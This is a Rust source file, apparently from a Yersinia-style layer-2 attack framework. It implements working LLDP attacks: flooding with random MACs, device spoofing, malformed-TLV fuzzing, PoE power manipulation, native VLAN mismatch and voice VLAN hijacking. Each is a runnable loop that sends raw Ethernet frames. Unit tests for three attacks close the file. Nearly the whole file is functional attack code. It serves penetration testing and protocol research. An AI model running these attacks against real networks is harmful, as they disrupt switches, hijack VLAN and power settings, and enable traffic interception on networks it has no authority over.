//! LLDP Attack Implementations

use super::packet::{LldpCapabilities, LldpPacket, LldpTlv, LldpTlvType, LLDP_TTL_DEFAULT};
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time::sleep;
use yersinia_core::{Attack, AttackContext, AttackStats as CoreAttackStats, Interface, Result};

/// LLDP multicast MAC address (IEEE 802.1AB nearest bridge)
const LLDP_MULTICAST_MAC: [u8; 6] = [0x01, 0x80, 0xc2, 0x00, 0x00, 0x0e];

/// Helper function to build Ethernet frame with LLDP payload
fn build_lldp_frame(src_mac: [u8; 6], lldp_packet: &LldpPacket) -> Vec<u8> {
    let lldp_payload = lldp_packet.to_bytes();
    let mut frame = Vec::with_capacity(14 + lldp_payload.len());

    // Ethernet header
    frame.extend_from_slice(&LLDP_MULTICAST_MAC); // Destination MAC (LLDP multicast)
    frame.extend_from_slice(&src_mac); // Source MAC
    frame.extend_from_slice(&[0x88, 0xcc]); // EtherType: LLDP (0x88cc)

    // LLDP payload
    frame.extend_from_slice(&lldp_payload);

    frame
}

/// Helper to send LLDP packet
async fn send_lldp_packet(
    interface: &Interface,
    src_mac: [u8; 6],
    packet: &LldpPacket,
) -> Result<()> {
    let frame = build_lldp_frame(src_mac, packet);
    interface.send_raw(&frame)
}

/// LLDP Flooding Attack
#[derive(Debug, Clone)]
pub struct LldpFloodingAttack {
    pub system_name_prefix: String,
    pub interval_ms: u32,
    pub count: Option<u64>,
    pub randomize_mac: bool,
}

impl LldpFloodingAttack {
    pub fn new(system_name_prefix: String, interval_ms: u32) -> Self {
        Self {
            system_name_prefix,
            interval_ms,
            count: None,
            randomize_mac: true,
        }
    }

    pub fn build_packet(&self, index: u64, src_mac: [u8; 6]) -> LldpPacket {
        let system_name = format!("{}-{}", self.system_name_prefix, index);
        let port_id = format!("eth{}", index % 48);

        LldpPacket::new_complete(
            src_mac,
            &port_id,
            LLDP_TTL_DEFAULT,
            Some(&system_name),
            Some("Yersinia LLDP Flooder"),
            Some(&port_id),
            Some((
                LldpCapabilities::BRIDGE | LldpCapabilities::ROUTER,
                LldpCapabilities::BRIDGE,
            )),
        )
    }
}

/// LLDP Device Spoofing Attack
#[derive(Debug, Clone)]
pub struct LldpSpoofingAttack {
    pub chassis_id: [u8; 6],
    pub port_id: String,
    pub system_name: String,
    pub system_description: String,
    pub port_description: String,
    pub capabilities: u16,
    pub enabled_capabilities: u16,
    pub ttl: u16,
    pub interval_ms: u32,
}

impl LldpSpoofingAttack {
    pub fn new(chassis_id: [u8; 6], port_id: String, system_name: String) -> Self {
        Self {
            chassis_id,
            port_id,
            system_name,
            system_description: "Yersinia LLDP Spoofer".to_string(),
            port_description: "Ethernet Interface".to_string(),
            capabilities: LldpCapabilities::BRIDGE | LldpCapabilities::ROUTER,
            enabled_capabilities: LldpCapabilities::BRIDGE | LldpCapabilities::ROUTER,
            ttl: LLDP_TTL_DEFAULT,
            interval_ms: 30000, // 30 seconds (LLDP default)
        }
    }

    pub fn build_packet(&self) -> LldpPacket {
        LldpPacket::new_complete(
            self.chassis_id,
            &self.port_id,
            self.ttl,
            Some(&self.system_name),
            Some(&self.system_description),
            Some(&self.port_description),
            Some((self.capabilities, self.enabled_capabilities)),
        )
    }
}

/// LLDP TLV Fuzzing Attack
#[derive(Debug, Clone)]
pub struct LldpFuzzingAttack {
    pub tlv_type: Option<u8>,
    pub tlv_length: Option<u16>,
    pub interval_ms: u32,
}

impl LldpFuzzingAttack {
    pub fn new() -> Self {
        Self {
            tlv_type: None,
            tlv_length: None,
            interval_ms: 100,
        }
    }

    pub fn build_malformed_packet(&self, iteration: u64, src_mac: [u8; 6]) -> Vec<u8> {
        let mut packet = LldpPacket::new();

        // Add mandatory TLVs first
        packet.add_tlv(LldpTlv::chassis_id_mac(src_mac));
        packet.add_tlv(LldpTlv::port_id_interface("fuzz0"));

        // Add fuzzing TLV
        let fuzz_type = self.tlv_type.unwrap_or((iteration % 128) as u8);
        let fuzz_length = self.tlv_length.unwrap_or(((iteration * 13) % 512) as u16);

        // Create malformed TLV with potentially invalid length
        let mut fuzz_data = Vec::with_capacity(fuzz_length as usize);
        for i in 0..fuzz_length {
            fuzz_data.push(((iteration + i as u64) % 256) as u8);
        }

        // Manually construct potentially malformed TLV header
        let type_length = ((fuzz_type as u16) << 9) | (fuzz_length & 0x1FF);
        let mut fuzz_bytes = type_length.to_be_bytes().to_vec();
        fuzz_bytes.extend_from_slice(&fuzz_data);

        // Get normal packet bytes and insert fuzz TLV before End
        let mut bytes = packet.to_bytes();
        bytes.extend_from_slice(&fuzz_bytes);

        // Add End TLV
        bytes.extend_from_slice(&LldpTlv::end_of_lldpdu().to_bytes());

        bytes
    }
}

impl Default for LldpFuzzingAttack {
    fn default() -> Self {
        Self::new()
    }
}

/// LLDP PoE Manipulation Attack
#[derive(Debug, Clone)]
pub struct LldpPoeManipulationAttack {
    pub chassis_id: [u8; 6],
    pub port_id: String,
    pub power_request_mw: u32,
    pub power_priority: u8,
    pub ttl: u16,
}

impl LldpPoeManipulationAttack {
    pub fn new(chassis_id: [u8; 6], power_request_mw: u32) -> Self {
        Self {
            chassis_id,
            port_id: "eth0".to_string(),
            power_request_mw,
            power_priority: 1, // Critical
            ttl: LLDP_TTL_DEFAULT,
        }
    }
}

/// LLDP Native VLAN Mismatch Attack
#[derive(Debug, Clone)]
pub struct LldpNativeVlanMismatchAttack {
    pub chassis_id: [u8; 6],
    pub port_id: String,
    pub advertised_native_vlan: u16,
    pub ttl: u16,
}

impl LldpNativeVlanMismatchAttack {
    pub fn new(chassis_id: [u8; 6], advertised_native_vlan: u16) -> Self {
        Self {
            chassis_id,
            port_id: "GigabitEthernet0/1".to_string(),
            advertised_native_vlan,
            ttl: LLDP_TTL_DEFAULT,
        }
    }
}

/// LLDP Voice VLAN Hijacking Attack
#[derive(Debug, Clone)]
pub struct LldpVoiceVlanHijackingAttack {
    pub chassis_id: [u8; 6],
    pub port_id: String,
    pub voice_vlan: u16,
    pub system_name: String,
    pub ttl: u16,
}

impl LldpVoiceVlanHijackingAttack {
    pub fn new(chassis_id: [u8; 6], voice_vlan: u16) -> Self {
        Self {
            chassis_id,
            port_id: "Port 1".to_string(),
            voice_vlan,
            system_name: "VoIP-Phone".to_string(),
            ttl: LLDP_TTL_DEFAULT,
        }
    }
}

// ============================================================================
// Attack Trait Implementations
// ============================================================================

#[async_trait]
impl Attack for LldpPoeManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(30); // LLDP standard interval

        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                // Build LLDP packet with PoE manipulation
                let mut packet = LldpPacket::new_complete(
                    self.chassis_id,
                    &self.port_id,
                    self.ttl,
                    Some("PoE-Device"),
                    Some("Yersinia PoE Manipulation"),
                    Some(&self.port_id),
                    Some((
                        LldpCapabilities::BRIDGE | LldpCapabilities::ROUTER,
                        LldpCapabilities::BRIDGE,
                    )),
                );

                // Add IEEE 802.3 PoE TLV (Type 127 - Organization Specific)
                // Format: Type=127, OUI=00-12-0F (IEEE 802.3), Subtype=2 (PSE)
                let mut poe_data = vec![
                    0x00, 0x12, 0x0F, // IEEE 802.3 OUI
                    0x02, // Subtype: PSE (Power Sourcing Equipment)
                ];

                // Power type and source
                poe_data.push(self.power_priority); // Priority
                poe_data.push(0x01); // Power type: Type 2 PSE

                // Power value (in 0.1W units, big-endian)
                let power_value = (self.power_request_mw / 100) as u16;
                poe_data.extend_from_slice(&power_value.to_be_bytes());

                packet.add_tlv(LldpTlv::new(
                    LldpTlvType::OrganizationallySpecific,
                    poe_data,
                ));

                // Send packet
                if let Err(_e) = send_lldp_packet(&ctx.interface, self.chassis_id, &packet).await {
                    // Silently continue on error
                } else {
                    ctx.stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                }
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "LLDP PoE Manipulation"
    }
}

#[async_trait]
impl Attack for LldpNativeVlanMismatchAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(30); // LLDP standard interval

        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                // Build LLDP packet with Native VLAN mismatch
                let mut packet = LldpPacket::new_complete(
                    self.chassis_id,
                    &self.port_id,
                    self.ttl,
                    Some("Switch"),
                    Some("Yersinia VLAN Mismatch"),
                    Some(&self.port_id),
                    Some((
                        LldpCapabilities::BRIDGE | LldpCapabilities::ROUTER,
                        LldpCapabilities::BRIDGE,
                    )),
                );

                // Add IEEE 802.1 VLAN TLV (Type 127 - Organization Specific)
                // Format: Type=127, OUI=00-80-C2 (IEEE 802.1), Subtype=1 (Port VLAN ID)
                let mut vlan_data = vec![
                    0x00, 0x80, 0xC2, // IEEE 802.1 OUI
                    0x01, // Subtype: Port VLAN ID
                ];
                vlan_data.extend_from_slice(&self.advertised_native_vlan.to_be_bytes());

                packet.add_tlv(LldpTlv::new(
                    LldpTlvType::OrganizationallySpecific,
                    vlan_data,
                ));

                // Send packet
                if let Err(_e) = send_lldp_packet(&ctx.interface, self.chassis_id, &packet).await {
                    // Silently continue on error
                } else {
                    ctx.stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                }
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "LLDP Native VLAN Mismatch"
    }
}

#[async_trait]
impl Attack for LldpVoiceVlanHijackingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(30); // LLDP standard interval

        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                // Build LLDP packet with Voice VLAN configuration
                let mut packet = LldpPacket::new_complete(
                    self.chassis_id,
                    &self.port_id,
                    self.ttl,
                    Some(&self.system_name),
                    Some("Yersinia Voice VLAN Hijack"),
                    Some(&self.port_id),
                    Some((LldpCapabilities::TELEPHONE, LldpCapabilities::TELEPHONE)),
                );

                // Add IEEE 802.1 Voice VLAN TLV (Type 127 - Organization Specific)
                // Format: Type=127, OUI=00-80-C2 (IEEE 802.1), Subtype=3 (Protocol VLAN ID)
                let mut voice_vlan_data = vec![
                    0x00, 0x80, 0xC2, // IEEE 802.1 OUI
                    0x03, // Subtype: Protocol VLAN ID (used for voice)
                ];

                // Flags and VLAN ID
                voice_vlan_data.push(0x01); // Enabled + Supported
                voice_vlan_data.extend_from_slice(&self.voice_vlan.to_be_bytes());

                packet.add_tlv(LldpTlv::new(
                    LldpTlvType::OrganizationallySpecific,
                    voice_vlan_data,
                ));

                // Add Cisco-specific TLV for Voice VLAN (for compatibility)
                let mut cisco_voice = vec![
                    0x00, 0x00, 0x0C, // Cisco OUI
                    0x01, // Voice VLAN subtype
                ];
                cisco_voice.extend_from_slice(&self.voice_vlan.to_be_bytes());
                packet.add_tlv(LldpTlv::new(
                    LldpTlvType::OrganizationallySpecific,
                    cisco_voice,
                ));

                // Send packet
                if let Err(_e) = send_lldp_packet(&ctx.interface, self.chassis_id, &packet).await {
                    // Silently continue on error
                } else {
                    ctx.stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                }
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "LLDP Voice VLAN Hijacking"
    }
}

#[async_trait]
impl Attack for LldpFloodingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(self.interval_ms as u64);
        let mut packets_sent = 0u64;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            if let Some(max_count) = self.count {
                if packets_sent >= max_count {
                    break;
                }
            }

            let src_mac = if self.randomize_mac {
                [
                    rand::random(),
                    rand::random(),
                    rand::random(),
                    rand::random(),
                    rand::random(),
                    rand::random(),
                ]
            } else {
                ctx.interface.mac_address.0
            };

            let packet = self.build_packet(packets_sent, src_mac);

            if let Err(e) = send_lldp_packet(&ctx.interface, src_mac, &packet).await {
                ctx.stats.increment_errors();
                eprintln!("Error sending LLDP flooding packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                packets_sent += 1;
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "LLDP Flooding"
    }
}

#[async_trait]
impl Attack for LldpSpoofingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(self.interval_ms as u64);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let packet = self.build_packet();

            if let Err(e) = send_lldp_packet(&ctx.interface, self.chassis_id, &packet).await {
                ctx.stats.increment_errors();
                eprintln!("Error sending LLDP spoofing packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "LLDP Device Spoofing"
    }
}

#[async_trait]
impl Attack for LldpFuzzingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(self.interval_ms as u64);
        let mut iteration = 0u64;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let src_mac = ctx.interface.mac_address.0;
            let malformed_frame = self.build_malformed_packet(iteration, src_mac);

            if let Err(e) = ctx.interface.send_raw(&malformed_frame) {
                ctx.stats.increment_errors();
                eprintln!("Error sending LLDP fuzzing packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
            }

            iteration += 1;
            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "LLDP TLV Fuzzing"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_flooding_attack() {
        let attack = LldpFloodingAttack::new("test".to_string(), 100);
        let mac = [0x00, 0x11, 0x22, 0x33, 0x44, 0x55];

        let packet = attack.build_packet(42, mac);
        assert!(packet.get_system_name().unwrap().contains("test-42"));
    }

    #[test]
    fn test_spoofing_attack() {
        let mac = [0x00, 0x11, 0x22, 0x33, 0x44, 0x55];
        let attack = LldpSpoofingAttack::new(mac, "eth0".to_string(), "EvilRouter".to_string());

        let packet = attack.build_packet();
        assert_eq!(packet.get_system_name(), Some("EvilRouter".to_string()));
    }

    #[test]
    fn test_fuzzing_attack() {
        let attack = LldpFuzzingAttack::new();
        let mac = [0x00, 0x11, 0x22, 0x33, 0x44, 0x55];

        let bytes = attack.build_malformed_packet(1, mac);
        assert!(!bytes.is_empty());
    }
}
